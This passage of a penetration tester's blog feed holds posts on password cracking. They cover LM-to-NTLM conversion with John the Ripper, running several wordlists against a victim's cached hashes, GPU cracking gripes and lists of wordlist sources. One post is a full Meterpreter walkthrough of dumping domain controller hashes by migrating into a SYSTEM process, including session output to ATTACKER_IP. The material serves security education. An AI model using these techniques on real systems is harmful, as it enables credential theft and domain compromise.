-&lt;p&gt;And the edited version of the above: &lt;a href=&#34;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&#34;&gt;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;But Metasploit&amp;rsquo;s is currently &lt;a href=&#34;http://dev.metasploit.com/redmine/issues/7351&#34;&gt;borked&lt;/a&gt;,(&lt;strong&gt;Update: this is now fixed&lt;/strong&gt;) I don&amp;rsquo;t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2011/03/29/7&#34;&gt;http://www.openwall.com/lists/john-dev/2011/03/29/7&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;And I asked on that same list what had become of it:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/2&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/2&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The result is as follows:&lt;/p&gt;
-&lt;p&gt;Given this hash:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&amp;rsquo;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;cracked the LM side in 16 seconds. Now you don&amp;rsquo;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;
-&lt;p&gt;Solar Designer (JtR&amp;rsquo;s main dev) suggested the following path:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;A bit hard to read but here are the commands:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked      
-./john -w=cracked -rules:nt -format=nt pwdump.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see (if you squint) that works well. Rich Rumble suggested:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/3&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/3&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;using the loopback as so: &lt;code&gt;./john pwdump.txt -format=nt -loopback=john.pot -rules=nt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;The loopback been an amazing addition that is as Solar Designer put it &amp;ldquo;not in core JtR, it is a fairly recent addition to jumbo&amp;rdquo;. The loopback allows you to use previously cracked passwords as a dictionary without doing any cut/awk/sed voodoo. The problem with the suggested method for going from LM to NTLM and the loopback option is that it (rightly so) identifies LM hashes by their halves. When it tries to use those halves to crack the NTLM, every with the NT rule-set, it sees each half as separate passwords to try, so it fails.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Multiple Dictionaries or Wordlists Using John the Ripper</title>
-      <link>https://malicious.link/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</link>
-      <pubDate>Mon, 12 Sep 2011 08:09:46 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
-      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&amp;rsquo;s just your standard john arguments.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>GPU Cracking Complaints</title>
-      <link>https://malicious.link/post/2011/2011-07-13-gpu-cracking-complaints/</link>
-      <pubDate>Wed, 13 Jul 2011 14:02:13 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-07-13-gpu-cracking-complaints/</guid>
-      <description>&lt;p&gt;I&amp;rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&amp;rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: I have very little crypto knowledge and even less GPU programming knowledge so I only get to complain as a user and not as someone who can actually fix the things I complain about.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Lack of LM support. I get that this is a complicated hashing algorithm, but the fact that 90% of companies still have it turned on and cracking any more than a few with Rainbow Tables is impractical unless you have a SSD raid with a GPU based cracker ($$$$$).&lt;/li&gt;
-&lt;li&gt;Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn&amp;rsquo;t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe).
-&lt;ul&gt;
-&lt;li&gt;I say &amp;lsquo;The best way&amp;rsquo; because anything that has a key space larger than upper-alpha-numeric-32symbol (LM) is just a bit nuts to try and brute force out of the gate unless your goal is to &amp;lsquo;crack them all&amp;rsquo;. Me as a pentester, I want to get as many as possible, as quick as possible, so this means dictionaries are the smarter option. (Maybe later I can do the straight brute if I really need / want to)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it&amp;rsquo;s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it&amp;rsquo;s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say &amp;ldquo;oo oo I know this one&amp;rdquo; and auto populate it even before I start cracking. Why more cracking software writers don&amp;rsquo;t do this I&amp;rsquo;ll never know (would make their software seem a ton faster the more it is used)&lt;/li&gt;
-&lt;li&gt;Lack of formatting documentation (#ripshairout). Rare is the time I&amp;rsquo;ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don&amp;rsquo;t support standard formats)&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Those are my biggest gripes that the moment. If I am wrong on any account, let me know, I would love to know of a better way to do things.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
-      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
-      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
-      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;                ##                          ###           ##    ##
- ##  ##  #### ###### ####  #####   #####    ##    ####        ######
-####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
-####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
-## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
-##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
-                                      ##
-
-
-       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
-+ -- --=[ 687 exploits - 364 auxiliary - 43 post
-+ -- --=[ 217 payloads - 27 encoders - 8 nops
-       =[ svn r12622 updated today (2011.05.15)
-
-msf &amp;gt; 
-[*] DC_IP:49220 Request received for /AYSBk...
-[*] DC_IP:49220 Staging connection for target YSBk received...
-[*] Patching Target ID YSBk into DLL
-[*] DC_IP:49221 Request received for /BYSBk...
-[*] DC_IP:49221 Stage connection for target YSBk received...
-[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011
-
-msf &amp;gt; sessions -i 7
-[*] Starting interaction with 7...
-
-meterpreter &amp;gt; sysinfo
-System Language : en_US
-OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
-Computer        : DOMAINCONTROLLE
-Architecture    : x64 (Current Process is WOW64)
-Meterpreter     : x86/win32
-
-meterpreter &amp;gt; ps
-
-Process list
-============
-
- PID   Name                                       Arch  Session  User                          Path
- ---   ----                                       ----  -------  ----                          ----
- 0     [System Process]                                                                        
- 4     System                                     x64   0                                      
- 224   smss.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
- 324   csrss.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
- 364   csrss.exe                                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
- 372   wininit.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
- 404   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
- 468   services.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
- 476   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
- 484   lsm.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
- 628   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 708   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
- 804   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 836   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 880   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 932   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
- 972   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
- 328   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 1172  spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
- 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
- 1252  dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
- 1288  dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
- 1316  ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
- 1360  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 1392  vmtoolsd.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
- 1464  wlms.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlmswlms.exe
- 1492  dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
- 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
- 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
- 2016  vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
- 872   sppsvc.exe                                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
- 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbemWmiPrvSE.exe
- 2360  taskhost.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\System32\taskhost.exe
- 2424  dwm.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\dwm.exe
- 2452  explorer.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\explorer.exe
- 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
- 2512  conhost.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\conhost.exe
- 2632  VMwareTray.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareTray.exe
- 2640  VMwareUser.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareUser.exe
- 2716  mmc.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\mmc.exe
- 3052  mscorsvw.exe                               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Frameworkv4.0.30319\mscorsvw.exe
- 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
- 1932  mscorsvw.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft\.NET\Framework\64\v4.0.30319\mscorsvw.exe
- 2564  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
- 1732  msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
- 2992  notepad.exe                                x86   1        SITTINGDUCK\juser             C:\Windows\SysWOW64\notepad.exe
- 1720  notepad.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\notepad.exe
-
-
-meterpreter &amp;gt; getpid
-Current pid: 2992
-
-meterpreter &amp;gt; hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
-============================================================
-Enabled Process Privileges
-============================================================
-  SeDebugPrivilege
-  SeIncreaseQuotaPrivilege
-  SeMachineAccountPrivilege
-  SeSecurityPrivilege
-  SeTakeOwnershipPrivilege
-  SeLoadDriverPrivilege
-  SeSystemProfilePrivilege
-  SeSystemtimePrivilege
-  SeProfileSingleProcessPrivilege
-  SeIncreaseBasePriorityPrivilege
-  SeCreatePagefilePrivilege
-  SeBackupPrivilege
-  SeRestorePrivilege
-  SeShutdownPrivilege
-  SeSystemEnvironmentPrivilege
-  SeChangeNotifyPrivilege
-  SeRemoteShutdownPrivilege
-  SeUndockPrivilege
-  SeEnableDelegationPrivilege
-  SeManageVolumePrivilege
-
-meterpreter &amp;gt; hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
-...got system (via technique 1).
-
-meterpreter &amp;gt; hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
-[*] Migrating to 1720...
-[*] Migration completed successfully.
-
-meterpreter &amp;gt; hashdump
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
-meterpreter &amp;gt; hashdump 
-[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
-[*] Migrating to 1288...
-[*] Migration completed successfully.
-
-meterpreter &amp;gt; hashdump
-Administrator:500:MYLMHASH:MYNTLMHASH:::
-Guest:501:MYLMHASH:MYNTLMHASH:::
-krbtgtG:502:MYLMHASH:MYNTLMHASH:::
-Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
-juserN:1104:MYLMHASH:MYNTLMHASH:::
-jane.user??:1105:MYLMHASH:MYNTLMHASH:::
-DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::
-
-meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;
-&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Password / Word lists</title>
-      <link>https://malicious.link/post/2009/2009-09-18-password-word-lists/</link>
-      <pubDate>Fri, 18 Sep 2009 14:41:16 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-09-18-password-word-lists/</guid>
-      <description>&lt;p&gt;Brute force, even though it&amp;rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&amp;rsquo;s were word lists come in handy. It&amp;rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&amp;rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.&lt;/p&gt;
-&lt;p&gt;Matt Weir and company created a cool tool that has the best of both worlds, Dictionary based Rainbow Tables with Dr-Crack, which you can find here:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://reusablesec.googlepages.com/drcrack&#34;&gt;http://reusablesec.googlepages.com/drcrack&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;But, back to the reason of this post, word lists. Where do you get them? Here are a couple of my favorite places in no particular order:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://www.packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;br&gt;
-&lt;a href=&#34;http://www.theargon.com/achilles/wordlists/&#34;&gt;http://www.theargon.com/achilles/wordlists/&lt;/a&gt;&lt;br&gt;
-&lt;a href=&#34;http://www.openwall.com/wordlists/&#34;&gt;http://www.openwall.com/wordlists/&lt;/a&gt;&lt;br&gt;
-&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;I like to keep 3 size word lists:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;small and fast: usually based on the output of one of the tools i&amp;rsquo;m about to tell you about&lt;/li&gt;
-&lt;li&gt;medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I&amp;rsquo;m pretty picky about what goes into this list&lt;/li&gt;
-&lt;li&gt;huge: any wordlist I come across gets added to this list, it gets sorted and uniqued and restored&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Now the two tools that I like for the small list is are CeWL and wyd&lt;/p&gt;
-&lt;p&gt;CeWL - &lt;a href=&#34;http://www.digininja.org/projects/cewl.php&#34;&gt;http://www.digininja.org/projects/cewl.php&lt;/a&gt;&lt;br&gt;
-Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http://www.remote-exploit.org/codes_wyd.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;They have some very similar lists of features, your mileage may vary. But they basically parse files and web pages for words and generate password lists based on the words found.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-02-11 08:01 by Rob Fuller&lt;/p&gt;
-&lt;p&gt;Korelogic&amp;rsquo;s password lists: &lt;a href=&#34;http://contest.korelogic.com/wordlists.html&#34;&gt;http://contest.korelogic.com/wordlists.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Korelogic&amp;rsquo;s John rule set: &lt;a href=&#34;http://contest.korelogic.com/rules.html&#34;&gt;http://contest.korelogic.com/rules.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 05:00 by Rob Fuller&lt;/p&gt;
-&lt;p&gt;I missed one hell of a treasure trove of word lists:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://trac.kismac-ng.org/wiki/wordlists&#34;&gt;http://trac.kismac-ng.org/wiki/wordlists&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Right now, there list is this:&lt;/p&gt;
-&lt;h2 id=&#34;openwall&#34;&gt;OpenWall:&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&#34;&gt;http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;ftp://ftp.openwall.com/pub/wordlists/&#34;&gt;ftp://ftp.openwall.com/pub/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.openwall.com/mirrors/&#34;&gt;http://www.openwall.com/mirrors/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://passwordz.info/&#34;&gt;http://passwordz.info/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;ftp://ftp.ox.ac.uk/pub/wordlists/&#34;&gt;ftp://ftp.ox.ac.uk/pub/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://gdataonline.com/downloads/GDict/&#34;&gt;http://gdataonline.com/downloads/GDict/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/&#34;&gt;http://theargon.com/achilles/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://theargon.com/achilles/wordlists/theargonlists/&#34;&gt;http://theargon.com/achilles/wordlists/theargonlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;ftp://ftp.cerias.purdue.edu/pub/dict/&#34;&gt;ftp://ftp.cerias.purdue.edu/pub/dict/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.securinfos.info/wordlists_dictionnaires.php&#34;&gt;http://www.securinfos.info/wordlists_dictionnaires.php&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.vulnerabilityassessment.co.uk/passwords.htm&#34;&gt;http://www.vulnerabilityassessment.co.uk/passwords.htm&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.ai.uga.edu/ftplib/natural-language/moby/&#34;&gt;http://www.ai.uga.edu/ftplib/natural-language/moby/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.insidepro.com/eng/download.shtml&#34;&gt;http://www.insidepro.com/eng/download.shtml&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.word-list.com/&#34;&gt;http://www.word-list.com/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists1.htm&#34;&gt;http://www.cotse.com/tools/wordlists1.htm&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.cotse.com/tools/wordlists2.htm&#34;&gt;http://www.cotse.com/tools/wordlists2.htm&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&#34;&gt;http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.indianz.ch/tools/doc/wordlists.zip&#34;&gt;http://www.indianz.ch/tools/doc/wordlists.zip&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&#34;&gt;http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://hacor.org/docs/hugelist.txt&#34;&gt;http://hacor.org/docs/hugelist.txt&lt;/a&gt; (broken link. Does anyone have it hosted elsewhere?)
-&lt;ul&gt;
-&lt;li&gt;shhh! - &lt;a href=&#34;https://malicious.link/projects/hugelist.txt&#34;&gt;/projects/hugelist.txt&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;by-operat0r&#34;&gt;By operat0r&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&#34;&gt;http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&#34;&gt;http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&#34;&gt;http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://wiki.services.openoffice.org/wiki/Dictionaries&#34;&gt;http://wiki.services.openoffice.org/wiki/Dictionaries&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://article7.org/wordlists/&#34;&gt;http://article7.org/wordlists/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2010-03-30 04:22 by Rob Fuller&lt;/p&gt;
-&lt;p&gt;Recent additions:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.skullsecurity.org/wiki/index.php/Passwords&#34;&gt;http://www.skullsecurity.org/wiki/index.php/Passwords&lt;/a&gt;&lt;/li&gt;
